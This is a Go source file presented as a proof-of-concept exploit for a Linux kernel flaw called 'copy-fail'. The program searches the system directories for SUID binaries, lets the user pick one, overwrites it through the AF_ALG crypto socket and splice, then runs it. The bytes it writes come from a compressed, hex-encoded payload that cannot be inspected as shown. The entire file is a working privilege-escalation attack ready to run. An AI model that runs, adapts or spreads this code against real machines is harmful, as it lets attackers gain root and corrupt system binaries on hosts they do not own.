//go:build linux

package main

import (
	"bufio"
	"bytes"
	"compress/zlib"
	"encoding/hex"
	"fmt"
	"io"
	"io/fs"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"
)

// d decodes a hex string to a byte slice.
func d(x string) []byte {
	b, _ := hex.DecodeString(x)
	return b
}

// sockaddrALG mirrors struct sockaddr_alg from <linux/if_alg.h>.
type sockaddrALG struct {
	Family uint16
	Type   [14]byte
	Feat   uint32
	Mask   uint32
	Name   [64]byte
}

// buildCmsg packs a single cmsghdr + data buffer, CMSG_SPACE-aligned.
func buildCmsg(level, typ int32, data []byte) []byte {
	hdrLen := int(unsafe.Sizeof(syscall.Cmsghdr{}))
	totalLen := hdrLen + len(data)
	ptrSize := int(unsafe.Sizeof(uintptr(0)))
	paddedLen := (totalLen + ptrSize - 1) &^ (ptrSize - 1)
	buf := make([]byte, paddedLen)
	h := (*syscall.Cmsghdr)(unsafe.Pointer(&buf[0]))
	h.Len = uint64(totalLen)
	h.Level = level
	h.Type = typ
	copy(buf[hdrLen:], data)
	return buf
}

// writeChunk writes one 4-byte payload chunk at offset t inside the target
// file descriptor using the AF_ALG splice path.
func writeChunk(f int, t int, chunk []byte) {
	const (
		afALG   = 38     // AF_ALG
		solALG  = 279    // SOL_ALG
		msgMore = 0x8000 // MSG_MORE
	)

	fd, err := syscall.Socket(afALG, syscall.SOCK_SEQPACKET, 0)
	if err != nil {
		return
	}
	defer syscall.Close(fd)

	sa := sockaddrALG{Family: afALG}
	copy(sa.Type[:], "aead")
	copy(sa.Name[:], "authencesn(hmac(sha256),cbc(aes))")
	if _, _, errno := syscall.Syscall(syscall.SYS_BIND, uintptr(fd),
		uintptr(unsafe.Pointer(&sa)), unsafe.Sizeof(sa)); errno != 0 {
		return
	}

	key := d("0800010000000010" + strings.Repeat("0", 64))
	syscall.Syscall6(syscall.SYS_SETSOCKOPT, uintptr(fd), solALG, 1,
		uintptr(unsafe.Pointer(&key[0])), uintptr(len(key)), 0)
	syscall.Syscall6(syscall.SYS_SETSOCKOPT, uintptr(fd), solALG, 5, 0, 4, 0)

	syscall.Listen(fd, 0)

	newfd, _, errno := syscall.Syscall(syscall.SYS_ACCEPT, uintptr(fd), 0, 0)
	if errno != 0 {
		return
	}
	cfd := int(newfd)
	defer syscall.Close(cfd)

	iov := append(bytes.Repeat([]byte("A"), 4), chunk...)

	zero := make([]byte, 19)
	cm1 := buildCmsg(solALG, 3, zero[:4])
	cm2 := buildCmsg(solALG, 2, append([]byte{0x10}, zero...))
	cm3 := buildCmsg(solALG, 4, append([]byte{0x08}, zero[:3]...))
	oob := append(append(cm1, cm2...), cm3...)

	syscall.SendmsgN(cfd, iov, oob, nil, msgMore)

	r, w, err := os.Pipe()
	if err != nil {
		return
	}
	defer r.Close()
	defer w.Close()

	size := t + 4
	off := int64(0)
	syscall.Splice(f, &off, int(w.Fd()), nil, size, 0)
	syscall.Splice(int(r.Fd()), nil, cfd, nil, size, 0)

	buf := make([]byte, 8+t)
	syscall.Read(cfd, buf)
}

// searchDirs is the set of directories walked when looking for SUID binaries.
var searchDirs = []string{
	"/bin", "/sbin",
	"/usr/bin", "/usr/sbin",
	"/usr/local/bin", "/usr/local/sbin",
}

// findSUIDBinaries returns all SUID, world-readable regular files under searchDirs.
func findSUIDBinaries() []string {
	var results []string
	seen := make(map[string]bool)

	for _, root := range searchDirs {
		filepath.WalkDir(root, func(path string, entry fs.DirEntry, err error) error {
			if err != nil || entry.IsDir() || seen[path] {
				return nil
			}
			info, err := entry.Info()
			if err != nil {
				return nil
			}
			mode := info.Mode()
			if mode&fs.ModeSetuid != 0 && mode&0o004 != 0 {
				results = append(results, path)
				seen[path] = true
			}
			return nil
		})
	}
	return results
}

// pickTarget prints the found targets and prompts the user to select one.
func pickTarget(targets []string) string {
	fmt.Println("\nSUID world-readable binaries found:")
	fmt.Println("------------------------------------")
	for i, t := range targets {
		fmt.Printf("  [%d] %s\n", i+1, t)
	}
	fmt.Println()

	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Printf("Select target [1-%d]: ", len(targets))
		if !scanner.Scan() {
			os.Exit(1)
		}
		var choice int
		_, err := fmt.Sscanf(scanner.Text(), "%d", &choice)
		if err == nil && choice >= 1 && choice <= len(targets) {
			return targets[choice-1]
		}
		fmt.Println("Invalid selection, try again.")
	}
}

func main() {
	fmt.Println("CVE-2026-31431 (copy-fail) - Go PoC")
	fmt.Println("Based on grenkoca's original PoC")
	fmt.Println()
	fmt.Println("Scanning for SUID world-readable binaries...")

	targets := findSUIDBinaries()
	if len(targets) == 0 {
		fmt.Fprintln(os.Stderr, "No exploitable targets found.")
		os.Exit(1)
	}

	target := pickTarget(targets)
	fmt.Printf("\n[*] Targeting: %s\n", target)

	f, err := syscall.Open(target, 0, 0)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] open %s: %v\n", target, err)
		os.Exit(1)
	}

	compressed := d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3")
	zr, _ := zlib.NewReader(bytes.NewReader(compressed))
	payload, _ := io.ReadAll(zr)
	zr.Close()

	fmt.Printf("[*] Writing %d bytes to %s...\n", len(payload), target)
	for i := 0; i < len(payload); i += 4 {
		writeChunk(f, i, payload[i:i+4])
	}
	fmt.Println("[+] Write complete. Executing target...")

	cmd := exec.Command(target)
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Run()
}
